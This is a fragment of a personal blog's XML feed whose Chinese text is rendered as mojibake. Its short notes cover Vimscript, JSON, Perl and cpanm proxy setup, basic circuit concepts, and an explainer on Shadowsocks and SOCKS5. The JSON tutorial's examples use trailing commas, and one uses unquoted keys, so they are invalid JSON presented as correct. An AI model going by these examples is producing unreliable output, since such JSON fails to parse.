class="hljs-string">&quot;print.vim&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ³¨æ„, åœ¨å®šä¹‰å‡½æ•°æ—¶æ²¡æœ‰åŠ  <code>a:</code>, è€Œåœ¨ä½¿ç”¨å‡½æ•°æ—¶ç”¨äº† <code>a:</code>.</p><h1 id="å…³äº-list-åˆ—è¡¨èµ‹å€¼"><a href="#å…³äº-list-åˆ—è¡¨èµ‹å€¼" class="headerlink" title="å…³äº list åˆ—è¡¨èµ‹å€¼"></a>å…³äº list åˆ—è¡¨èµ‹å€¼</h1><p>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-variable">b:files</span> = [<br>  \ <span class="hljs-string">&quot;user/markdown-preview.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/vim-table-mode.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/vim-mundo.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/filetype.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/run.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/chineseCount.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/mark.vim&quot;</span>,<br>  \ <span class="hljs-string">&quot;user/mdtitle.vim&quot;</span>,<br>  \ ]<br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œçš„ <code>\</code> , ä¸åŠ åæ–œçº¿å°±ä¼šæŠ¥é”™.</p><h1 id="è·å–åˆ—è¡¨çš„é•¿åº¦"><a href="#è·å–åˆ—è¡¨çš„é•¿åº¦" class="headerlink" title="è·å–åˆ—è¡¨çš„é•¿åº¦"></a>è·å–åˆ—è¡¨çš„é•¿åº¦</h1><p>ä½¿ç”¨ <code>len()</code></p><h1 id="å‘½ä»¤è¡Œå‚æ•°"><a href="#å‘½ä»¤è¡Œå‚æ•°" class="headerlink" title="å‘½ä»¤è¡Œå‚æ•°"></a>å‘½ä»¤è¡Œå‚æ•°</h1><p>ä½äºåˆ—è¡¨ <code>v:argv</code> ä¸­.</p><h1 id="æ‰“å¼€å…‰æ ‡ä¸‹çš„-url"><a href="#æ‰“å¼€å…‰æ ‡ä¸‹çš„-url" class="headerlink" title="æ‰“å¼€å…‰æ ‡ä¸‹çš„ url"></a>æ‰“å¼€å…‰æ ‡ä¸‹çš„ url</h1><p>ä½¿ç”¨ <code>gx</code></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vimscript-å‡½æ•°åä¸­çš„-pound-sign-çš„ä½œç”¨</title>
    <link href="/2022/12/06/Vimscript-%E5%87%BD%E6%95%B0%E5%90%8D%E4%B8%AD%E7%9A%84-pound-sign-%E7%9A%84%E4%BD%9C%E7%94%A8/"/>
    <url>/2022/12/06/Vimscript-%E5%87%BD%E6%95%B0%E5%90%8D%E4%B8%AD%E7%9A%84-pound-sign-%E7%9A%84%E4%BD%9C%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://vi.stackexchange.com/questions/13006/what-is-the-meaining-of-symbol-in-function-name">å‚è€ƒ</a></p><p>å’Œ <code>.config/nvim/autoload</code> è¿™ä¸ªæ–‡ä»¶å¤¹æœ‰å…³, å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">:<span class="hljs-keyword">call</span> foo#bar#func()<br></code></pre></td></tr></table></figure><p>åˆ™ä¼šå¯»æ‰¾ <code>.config/nvim/autoload/foo/bar.vim</code> ä¸‹çš„ <code>foo#bar#func()</code> å‡½æ•°.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JSON-æ•™ç¨‹</title>
    <link href="/2022/12/06/JSON-%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/06/JSON-%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.runoob.com/json/json-tutorial.html">å‚è€ƒ</a></p><h1 id="JSON-ç®€ä»‹"><a href="#JSON-ç®€ä»‹" class="headerlink" title="JSON ç®€ä»‹"></a>JSON ç®€ä»‹</h1><p>JSON æŒ‡ JavaScript Object Notation, JavaScript å¯¹è±¡è¡¨ç¤ºæ³•.</p><p>JSON ä½¿ç”¨ JavaScript è¯­æ³•æ¥æè¿°æ•°æ®å¯¹è±¡.</p><h1 id="JSON-è¯­æ³•"><a href="#JSON-è¯­æ³•" class="headerlink" title="JSON è¯­æ³•"></a>JSON è¯­æ³•</h1><p>ä¸¤ç§ç»“æ„:</p><ul><li>å¯¹è±¡, ç”¨ <code>&#123;&#125;</code> ä¿å­˜</li><li>æ•°ç»„, ç”¨ <code>[]</code> ä¿å­˜</li></ul><h2 id="JSON-å†…çš„å¯¹è±¡"><a href="#JSON-å†…çš„å¯¹è±¡" class="headerlink" title="JSON å†…çš„å¯¹è±¡"></a>JSON å†…çš„å¯¹è±¡</h2><p>å¯¹è±¡, é”®å€¼å¯¹çš„é›†åˆ, ç”¨ <code>&#123;&#125;</code> ä¿å­˜.</p><p>å„é”®å€¼å¯¹ç”¨ <code>,</code> åˆ†éš”. å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hello&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;world&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>é”®å€¼å¯¹çš„å€¼å¯ä»¥æ˜¯å¯¹è±¡, å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;hello&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;world&quot;</span><span class="hljs-punctuation">,</span> <br>    <span class="hljs-attr">&quot;test&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;test1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;test2&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ok&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="JSON-å†…çš„æ•°ç»„"><a href="#JSON-å†…çš„æ•°ç»„" class="headerlink" title="JSON å†…çš„æ•°ç»„"></a>JSON å†…çš„æ•°ç»„</h2><p>æ•°ç»„, ç”¨ <code>[]</code> ä¿å­˜.</p><p>æ•°ç»„å†…çš„å€¼ç”¨ <code>,</code> åˆ†éš”.</p><p>å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;array1&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">,</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span> <span class="hljs-number">3</span><span class="hljs-punctuation">,</span> <span class="hljs-number">4</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br><span class="hljs-punctuation">&#125;</span> <br></code></pre></td></tr></table></figure><p>æ•°ç»„å†…å¯ä»¥æ˜¯å¯¹è±¡, å¦‚:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><br>    <span class="hljs-punctuation">&#123;</span> key1<span class="hljs-punctuation">:</span> value1<span class="hljs-punctuation">,</span> key2<span class="hljs-punctuation">:</span> value2 <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-punctuation">&#123;</span> key3<span class="hljs-punctuation">:</span> value3<span class="hljs-punctuation">,</span> key4<span class="hljs-punctuation">:</span> value4 <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    ...<br><span class="hljs-punctuation">]</span> <br></code></pre></td></tr></table></figure><h2 id="JSON-ä¸­çš„ç‰¹æ®Šå€¼"><a href="#JSON-ä¸­çš„ç‰¹æ®Šå€¼" class="headerlink" title="JSON ä¸­çš„ç‰¹æ®Šå€¼"></a>JSON ä¸­çš„ç‰¹æ®Šå€¼</h2><p>å¯ç›´æ¥ç”¨ <code>true</code> å’Œ <code>false</code> è¡¨ç¤ºå¸ƒå°”å€¼.</p><p>ç”¨ <code>null</code> è¡¨ç¤ºç©º.</p>]]></content>
    
    
    <categories>
      
      <category>JSON</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Perl-ä¸­-experimental-æŠ¥é”™</title>
    <link href="/2022/12/06/Perl-%E4%B8%AD-experimental-%E6%8A%A5%E9%94%99/"/>
    <url>/2022/12/06/Perl-%E4%B8%AD-experimental-%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/43376193/how-to-mute-that-when-and-given-are-experimental-in-perl">å‚è€ƒ</a></p><p>ä½¿ç”¨å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> experimental <span class="hljs-string">qw( switch )</span>;<br></code></pre></td></tr></table></figure><p>å¯ä»¥è§£å†³.</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-record-å’Œ-field</title>
    <link href="/2022/12/05/%E5%85%B3%E4%BA%8E-record-%E5%92%8C-field/"/>
    <url>/2022/12/05/%E5%85%B3%E4%BA%8E-record-%E5%92%8C-field/</url>
    
    <content type="html"><![CDATA[<p>field ç¿»è¯‘ä¸ºå­—æ®µï¼Œå…¶å®å¯ä»¥ç†è§£ä¸ºé¢†åŸŸï¼Œå³ä¸€ç±»äº‹ç‰©ï¼Œåœ¨è¡¨ä¸­ï¼ŒåŒä¸€ç«–åˆ—å¯ä»¥è¡¨ç¤ºä¸ºåŒä¸€ç±»äº‹ç‰©ï¼Œå› æ­¤ field ä¸ºè¡¨ä¸­çš„åˆ—.</p><p>record ç¿»è¯‘ä¸ºè®°å½•ï¼Œå³è®°å½•ä¸€ä¸ªäº‹ç‰©çš„è¡Œä¸ºï¼Œä¸ºè¡¨ä¸­çš„è¡Œ.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Vim-ä¸­-gv-å‘½ä»¤</title>
    <link href="/2022/12/04/Vim-%E4%B8%AD-gv-%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/12/04/Vim-%E4%B8%AD-gv-%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<p>æ¯”å¦‚å½“å‰é€‰ä¸­ä¸€æ®µæ–‡å­—:<br><img src="/../img/select_a_piece_of_text.png"></p><p>ç„¶åç§»åŠ¨åˆ°å¦å¤–ä¸€ä¸ªåœ°æ–¹:<br><img src="/../img/move_to_another_place.png"></p><p>åœ¨æ™®é€šæ¨¡å¼ä¸‹æŒ‰ <code>gv</code>, åˆ™ä¼šå›åˆ°ä¹‹å‰é€‰ä¸­çš„éƒ¨ä½:<br><img src="/../img/select_a_piece_of_text.png"></p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºç”µåŠ¿ä»¥åŠç”µè·æ‰€å¸¦çš„ç”µåŠ¿èƒ½</title>
    <link href="/2022/12/04/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%BF%E4%BB%A5%E5%8F%8A%E7%94%B5%E8%8D%B7%E6%89%80%E5%B8%A6%E7%9A%84%E7%94%B5%E5%8A%BF%E8%83%BD/"/>
    <url>/2022/12/04/%E5%85%B3%E4%BA%8E%E7%94%B5%E5%8A%BF%E4%BB%A5%E5%8F%8A%E7%94%B5%E8%8D%B7%E6%89%80%E5%B8%A6%E7%9A%84%E7%94%B5%E5%8A%BF%E8%83%BD/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æ­£ç”µè·åœ¨ç”µåŠ¿é«˜çš„åœ°æ–¹ï¼Œç”µåŠ¿èƒ½é«˜.</p></blockquote><p>$$<br>\displaylines{U \uparrow &#x3D; \phi \uparrow \cdot q }<br>$$<br>ä»å…¬å¼å¯ä»¥çœ‹å‡ºï¼Œç”µè·ä¸ºæ­£æ—¶ï¼Œ $\phi$ å¢å¤§ï¼Œ $U$ å°±ä¼šå¢å¤§.</p><blockquote><p>è´Ÿç”µè·åœ¨ç”µåŠ¿ä½çš„åœ°æ–¹ï¼Œç”µåŠ¿èƒ½é«˜.<br>$$<br>\displaylines{U \uparrow &#x3D; \phi \downarrow \cdot q }<br>$$<br>ä»å…¬å¼å¯ä»¥çœ‹å‡ºï¼Œç”µè·ä¸ºè´Ÿæ—¶ï¼Œ $\phi$ å¢å¤§ï¼Œ $U$ å°±ä¼šè´Ÿå¾—è¶Šå¤šï¼Œä¹Ÿå°±å‡å°ï¼Œè€Œ $\phi$ å‡å°æ—¶ï¼Œ $U$ è´Ÿå¾—è¶Šå°‘ï¼Œä¹Ÿå°±å¢å¤§.</p></blockquote><h1 id="åœ¨ç”µè·¯ä¸­"><a href="#åœ¨ç”µè·¯ä¸­" class="headerlink" title="åœ¨ç”µè·¯ä¸­"></a>åœ¨ç”µè·¯ä¸­</h1><p>ç”µæµä»é«˜ç”µåŠ¿æµå‘ä½ç”µåŠ¿æ—¶ï¼Œä¹Ÿå°±æ˜¯ç”µå­ä»ä½ç”µåŠ¿æµå‘é«˜ç”µåŠ¿ï¼Œç”µå­çš„èƒ½é‡å‡å°‘ï¼Œå³å‹é™.<br><img src="/../img/voltage_dorp_and_the_energy.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºå‹é™çš„æ–¹å‘</title>
    <link href="/2022/12/03/%E5%85%B3%E4%BA%8E%E5%8E%8B%E9%99%8D%E7%9A%84%E6%96%B9%E5%90%91/"/>
    <url>/2022/12/03/%E5%85%B3%E4%BA%8E%E5%8E%8B%E9%99%8D%E7%9A%84%E6%96%B9%E5%90%91/</url>
    
    <content type="html"><![CDATA[<p>ç”µå‹é™æŒ‡çš„æ˜¯ç”µå­èƒ½é‡å‡å°‘, ç”µå­ç©¿è¿‡ç”µå­å…ƒä»¶æ—¶ï¼Œèƒ½é‡æŸå¤±æ˜¯ç”±äºç”µé˜» (å³å’Œç”µå­å…ƒä»¶å†…åŸå­ç¢°æ’), è€Œä¸æ˜¯ç”±äºæ­£è´Ÿç”µè·çš„ä½œç”¨åŠ›.</p><p>ç”µå­å™¨ä»¶çš„å‹é™æ–¹å‘, å°±æ˜¯ â€œ+â€ -&gt; â€œ-â€œ çš„æ–¹å‘, è¿™æ˜¯ä¸€ä¸ªå‚è€ƒæ–¹å‘, å¹¶ä¸æ˜¯è¯´ â€œ+â€ å¸¦æ­£ç”µè·ï¼Œâ€-â€œ å¸¦è´Ÿç”µè·:</p><ul><li>è‹¥ç”µæµçš„æ–¹å‘ä¹Ÿæ˜¯è¿™ä¸ªæ–¹å‘, åˆ™ç”µå­è¡¨ç°ä¸ºç”µå‹é™, ç”µå­å¤±å»èƒ½é‡. </li><li>è‹¥ç”µæµçš„æ–¹å‘æ˜¯åæ–¹å‘, åˆ™ç”µå­è¡¨ç°ä¸ºç”µå‹å‡, ç”µå­è·å¾—èƒ½é‡.</li></ul><p><img src="/../img/voltage_drop_direction.png"></p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä¸ºä»€ä¹ˆè¦åŒºåˆ†ç”µæµæ–¹å‘å’Œç”µå­è¿åŠ¨æ–¹å‘</title>
    <link href="/2022/12/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8C%BA%E5%88%86%E7%94%B5%E6%B5%81%E6%96%B9%E5%90%91%E5%92%8C%E7%94%B5%E5%AD%90%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91/"/>
    <url>/2022/12/03/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8C%BA%E5%88%86%E7%94%B5%E6%B5%81%E6%96%B9%E5%90%91%E5%92%8C%E7%94%B5%E5%AD%90%E8%BF%90%E5%8A%A8%E6%96%B9%E5%90%91/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-çŸ¥ä¹"><a href="#å‚è€ƒ-çŸ¥ä¹" class="headerlink" title="å‚è€ƒ çŸ¥ä¹"></a><a href="https://www.zhihu.com/question/54598446/answer/140197910">å‚è€ƒ çŸ¥ä¹</a></h1><p>å¯ä»¥çœ‹ä½œæ˜¯å†å²é—ç•™é—®é¢˜ï¼Œèµ·åˆ, äººä»¬è®¤ä¸ºåœ¨å¯¼ä½“ä¸­ç§»åŠ¨çš„æ˜¯å¸¦æ­£ç”µè·çš„ç²’å­ï¼Œä½†ç°åœ¨å®é™…å‘ç°ç§»åŠ¨çš„æ˜¯å¸¦è´Ÿç”µçš„ç”µå­.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ç”µå¯¼å’Œç”µé˜»çš„å…³ç³»</title>
    <link href="/2022/12/03/%E7%94%B5%E5%AF%BC%E5%92%8C%E7%94%B5%E9%98%BB%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2022/12/03/%E7%94%B5%E5%AF%BC%E5%92%8C%E7%94%B5%E9%98%BB%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.zhihu.com/question/29511228/answer/2338826731">å‚è€ƒ çŸ¥ä¹</a></p><p>åœ¨è®¡ç®—ä¸Šï¼Œç”µå¯¼æ˜¯ç”µé˜»çš„å€’æ•°.<br>$$<br>\displaylines{\sigma &#x3D; \frac{1}{R}}<br>$$</p><p>å®é™…ä¸Šï¼Œç”µå¯¼å’Œç”µé˜»å…¶å®æ˜¯ä¸€ä¸ªé‡çš„ä¸¤ç§å½¢å¼, åœ¨æŸäº›æƒ…å†µä¸‹ä½¿ç”¨èµ·æ¥æ–¹ä¾¿.</p><p>ç”µé˜»å¤§ï¼Œç”µå¯¼å°±å°ï¼Œå°±ç†è§£ä¸ºå¯¼ç”µæ•ˆæœå·®.</p><p>ç”µé˜»å°ï¼Œç”µå¯¼å°±å¤§ï¼Œå°±ç†è§£ä¸ºå¯¼ç”µæ•ˆæœå¥½.</p>]]></content>
    
    
    <categories>
      
      <category>CAD</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-cpan-å’Œ-cpanm-çš„ä¸€ç‚¹åŒºåˆ«</title>
    <link href="/2022/12/03/%E5%85%B3%E4%BA%8E-cpan-%E5%92%8C-cpanm-%E7%9A%84%E4%B8%80%E7%82%B9%E5%8C%BA%E5%88%AB/"/>
    <url>/2022/12/03/%E5%85%B3%E4%BA%8E-cpan-%E5%92%8C-cpanm-%E7%9A%84%E4%B8%80%E7%82%B9%E5%8C%BA%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>cpan ç¨‹åºçš„é…ç½®æ–‡ä»¶ä½äº <code>~/.cpan/CPAN/MyConfig.pm</code>. é…ç½®å…¶ä»£ç†éœ€è¦æ±‚è¯¥å…¶é…ç½®æ–‡ä»¶.</p><p>cpanm ä¼¼ä¹æ˜¯ç›´æ¥è¯»å–ç¯å¢ƒå˜é‡ã€‚</p><h1 id="cpanm-è®¾ç½®å®‰è£…ä½ç½®ä»¥åŠä»£ç†"><a href="#cpanm-è®¾ç½®å®‰è£…ä½ç½®ä»¥åŠä»£ç†" class="headerlink" title="cpanm è®¾ç½®å®‰è£…ä½ç½®ä»¥åŠä»£ç†"></a>cpanm è®¾ç½®å®‰è£…ä½ç½®ä»¥åŠä»£ç†</h1><p>å…ˆç”¨å°†éœ€è¦çš„ç¯å¢ƒå˜é‡åˆ©ç”¨ <code>local::lib</code> æ¨¡å—å¯¼å…¥ <code>~/.zshrc</code> æˆ–å…¶ä»–ç¯å¢ƒæ–‡ä»¶ä¸­:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib &gt;&gt; ~/.zshrc<br></code></pre></td></tr></table></figure><p>ä¹‹åä¿®æ”¹å˜é‡å€¼å³å¯:j</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment"># Proxy</span><br><span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://10.0.8.4:3128&quot;</span><br><span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;http://10.0.8.4:3128&quot;</span><br><br><span class="hljs-comment"># Perl</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;/home/jie/Disk/Language/perl5/bin<span class="hljs-variable">$&#123;PATH:+:<span class="hljs-variable">$&#123;PATH&#125;</span>&#125;</span>&quot;</span><br><span class="hljs-built_in">export</span> PERL5LIB=<span class="hljs-string">&quot;/home/jie/Disk/Language/perl5/lib/perl5<span class="hljs-variable">$&#123;PERL5LIB:+:<span class="hljs-variable">$&#123;PERL5LIB&#125;</span>&#125;</span>&quot;</span><br><span class="hljs-built_in">export</span> PERL_LOCAL_LIB_ROOT=<span class="hljs-string">&quot;/home/jie/Disk/Language/perl5<span class="hljs-variable">$&#123;PERL_LOCAL_LIB_ROOT:+:<span class="hljs-variable">$&#123;PERL_LOCAL_LIB_ROOT&#125;</span>&#125;</span>&quot;</span><br><span class="hljs-built_in">export</span> PERL_MB_OPT=<span class="hljs-string">&quot;--install_base \&quot;/home/jie/Disk/Language/perl5\&quot;&quot;</span><br><span class="hljs-built_in">export</span> PERL_MM_OPT=<span class="hljs-string">&quot;INSTALL_BASE=/home/jie/Disk/Language/perl5&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å…³äº-Perl-æ¨¡å—-Log::Log4perl</title>
    <link href="/2022/12/03/%E5%85%B3%E4%BA%8E-Perl-%E6%A8%A1%E5%9D%97-Log::Log4perl/"/>
    <url>/2022/12/03/%E5%85%B3%E4%BA%8E-Perl-%E6%A8%A1%E5%9D%97-Log::Log4perl/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯æœºåœº-shadowsocks</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%BA%E5%9C%BA-shadowsocks/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E6%9C%BA%E5%9C%BA-shadowsocks/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ-ArchWiki"><a href="#å‚è€ƒ-ArchWiki" class="headerlink" title="å‚è€ƒ ArchWiki"></a><a href="https://wiki.archlinuxcn.org/wiki/Shadowsocks">å‚è€ƒ ArchWiki</a></h1><p>Shadowsocks æ˜¯ä¸€ä¸ªè½»é‡çº§ SOCKS5 ä»£ç†.</p><h1 id="ä»€ä¹ˆæ˜¯-Socks5-åè®®"><a href="#ä»€ä¹ˆæ˜¯-Socks5-åè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯ Socks5 åè®®"></a>ä»€ä¹ˆæ˜¯ Socks5 åè®®</h1><h2 id="å‚è€ƒ-B-ç«™"><a href="#å‚è€ƒ-B-ç«™" class="headerlink" title="å‚è€ƒ B ç«™"></a><a href="https://www.bilibili.com/video/BV1JA411u7mZ/?spm_id_from=333.337.search-card.all.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">å‚è€ƒ B ç«™</a></h2><h2 id="å‚è€ƒ-ç™¾åº¦ç™¾ç§‘"><a href="#å‚è€ƒ-ç™¾åº¦ç™¾ç§‘" class="headerlink" title="å‚è€ƒ ç™¾åº¦ç™¾ç§‘"></a><a href="https://baike.baidu.com/item/socks5/8915011">å‚è€ƒ ç™¾åº¦ç™¾ç§‘</a></h2><p>SOCKS5 åè®®æ˜¯ä¸€ç§ä»£ç†åè®®ï¼Œ</p><p>SOCKS5 æœåŠ¡å™¨åœ¨å°†é€šè®¯è¯·æ±‚å‘é€ç»™çœŸæ­£æœåŠ¡å™¨çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹äºè¯·æ±‚æ•°æ®åŒ…æœ¬èº«ä¸åŠ ä»»ä½•æ”¹å˜.</p><p>SOCKS5 æœåŠ¡å™¨åœ¨æ¥æ”¶åˆ°çœŸæ­£æœåŠ¡å™¨çš„å“åº”åï¼Œä¹ŸåŸæ ·è½¬å‘ç»™å‰ç«¯.</p><h2 id="å‚è€ƒ-åšå®¢-socket5-åè®®çš„å·¥ä½œè¿‡ç¨‹å’Œåè®®ç»†èŠ‚"><a href="#å‚è€ƒ-åšå®¢-socket5-åè®®çš„å·¥ä½œè¿‡ç¨‹å’Œåè®®ç»†èŠ‚" class="headerlink" title="å‚è€ƒ åšå®¢ socket5 åè®®çš„å·¥ä½œè¿‡ç¨‹å’Œåè®®ç»†èŠ‚"></a><a href="https://wiyi.org/socks5-protocol-in-deep.html">å‚è€ƒ åšå®¢ socket5 åè®®çš„å·¥ä½œè¿‡ç¨‹å’Œåè®®ç»†èŠ‚</a></h2><h3 id="ä»€ä¹ˆæ˜¯-socks-åè®®"><a href="#ä»€ä¹ˆæ˜¯-socks-åè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯ socks åè®®"></a>ä»€ä¹ˆæ˜¯ socks åè®®</h3><p>ç¤ºæ„å›¾:</p><p><img src="/../img/SOCKs5_diagram.png"></p><p>socks åè®®ä½äº OSI æ¨¡å‹ä¸­çš„ç¬¬äº”å±‚ï¼Œä¼šè¯å±‚:</p><p><img src="/../img/OSI_module.png"></p><p>socket æ˜¯æ˜æ–‡ä¼ è¾“ï¼Œç”¨äºç¿»å¢™å®¹æ˜“è¢«é˜»æ–­.</p><p>socks ç›¸å½“äºåœ¨é˜²ç«å¢™æ’•äº†ä¸€é“å£å­ï¼Œè®©åˆæ³•çš„ç”¨æˆ·å¯ä»¥é€šè¿‡å£å­è¿æ¥åˆ°å†…éƒ¨, ä»è€Œè®¿é—®å†…éƒ¨çš„ä¸€äº›èµ„æºå’Œè¿›è¡Œç®¡ç†.</p><h3 id="ä»€ä¹ˆæ˜¯-socks5-åè®®"><a href="#ä»€ä¹ˆæ˜¯-socks5-åè®®" class="headerlink" title="ä»€ä¹ˆæ˜¯ socks5 åè®®"></a>ä»€ä¹ˆæ˜¯ socks5 åè®®</h3><p>socks5 æ˜¯ socks åè®®çš„ç¬¬äº”ä¸ªç‰ˆæœ¬.</p><p>socks5 åœ¨ socks4 çš„åŸºç¡€ä¸Šæ–°å¢ UDP è½¬å‘å’Œè®¤è¯åŠŸèƒ½ï¼Œä½†æ˜¯ socks5 å¹¶ä¸å…¼å®¹ sock4 åè®®.</p><h3 id="å·¥ä½œè¿‡ç¨‹"><a href="#å·¥ä½œè¿‡ç¨‹" class="headerlink" title="å·¥ä½œè¿‡ç¨‹"></a>å·¥ä½œè¿‡ç¨‹</h3><p>æµè§ˆå™¨å…ˆå’Œ socks5 ä»£ç†å»ºç«‹ TCP è¿æ¥.</p><p><img src="/../img/how_socks5_works.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ä»€ä¹ˆæ˜¯è½¯è·¯ç”±</title>
    <link href="/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E8%B7%AF%E7%94%B1/"/>
    <url>/2022/12/01/%E4%BB%80%E4%B9%88%E6%98%AF%E8%BD%AF%E8%B7%AF%E7%94%B1/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
